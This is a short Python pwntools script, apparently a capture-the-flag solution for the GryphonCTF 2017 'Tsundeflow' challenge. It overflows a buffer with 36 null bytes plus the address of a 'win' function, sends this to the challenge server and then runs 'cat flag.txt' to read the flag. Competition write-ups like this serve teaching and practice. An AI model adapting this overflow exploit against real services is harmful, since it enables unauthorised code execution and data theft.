#! /usr/bin/env python3
##
# Created for GryphonCTF 2017_Tsundeflow
# By Amos (LFlare) Ng <amosng1@gmail.com>
##
# Imports
from pwn import *

# Extract `win` address
elf = ELF("tsundeflow-redacted-fb0908a3d9a30c4029acfdfd5bdbe313")
win = pack(elf.symbols[b"win"])

# Prepare payload
payload = b"\x00" * 36 + win

# Logging
with log.progress("Cracking SOCKS5...") as p:
    # Create socket
    t = remote("pwn2.chal.gryphonctf.com", 17343)

    # Send payload
    t.recvuntil("Your response? ")
    t.sendline(payload)
    t.recvline()

    # Get flag
    t.sendline("cat flag.txt")
    flag = t.recvline().decode()
    p.success(flag)
